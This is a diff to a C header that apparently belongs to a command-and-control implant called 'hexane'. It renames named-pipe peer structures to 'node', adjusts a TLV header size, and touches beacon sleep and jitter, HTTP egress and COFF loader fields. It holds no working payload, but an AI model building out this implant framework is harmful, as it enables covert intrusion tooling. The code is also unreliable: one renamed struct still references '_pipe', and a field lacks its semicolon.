@@ -146,8 +146,7 @@
 #define IOCTL1                                      0x80862007
 
 #pragma region TLV
-#define HEADER_SIZE                                 (sizeof(UINT32) * 3)
-#define SEGMENT_HEADER_SIZE                         ((sizeof(UINT32) * 6) + sizeof(UINT32))
+#define HEADER_SIZE                                 ((sizeof(UINT32) * 6) + sizeof(BYTE))
 #define HTTP_REQUEST_MAX                            0x300000
 #pragma endregion
 
@@ -413,12 +412,12 @@ typedef struct _token {
 	_token* Next;
 } TOKEN, *PTOKEN;
 
-typedef struct _pipe {
-	DWORD    PeerId;
+typedef struct _node {
+	DWORD    NodeId;
 	HANDLE   PipeHandle;
 	LPWSTR   PipeName;
 	_pipe  	*Next;
-} PIPE, *PPIPE;
+} NODE, *PNODE;
 
 typedef void (*OBJ_ENTRY)(char* args, uint32_t size);
 
@@ -444,7 +443,7 @@ typedef struct _parser {
 
 typedef struct _packet {
     BYTE    	TransportType;
-    ULONG   	PeerId;
+    ULONG   	NodeId;
     ULONG   	TaskId;
     ULONG   	MsgType;
     ULONG   	MsgLength;
@@ -459,7 +458,7 @@ struct _hexane {
 	LPVOID        	Heap;
 	DWORD         	nThreads;
 	PCOFF_PARAMS  	DataCache;
-	PPIPE    		PeerCache;
+	PNODE    		NodeCache;
 	PPACKET 		MessageCache;
 
 	struct {
@@ -481,7 +480,7 @@ struct _hexane {
 		ULONG   Sleeptime;
 		ULONG   Jitter;
 		ULONG   Hours;
-		DWORD 	PeerId
+		DWORD 	NodeId
 	} Config;
 
 	struct {
@@ -492,13 +491,14 @@ struct _hexane {
 		ULONG  Version;
 		ULONG  CurrentTaskId;
 		UINT32 Retries;
+		BOOL   Connected;
 		BOOL   CheckIn;
 	} Session;
 
 	struct {
 		PHTTP 	Http;
-        LPWSTR  EgressName;
-        HANDLE  EgressHandle;
+        LPWSTR  PipeName;
+        HANDLE  PipeHandle;
 		LPSTR   Domain;
 		LPVOID  EnvProxy;
 		SIZE_T  nEnvProxy;
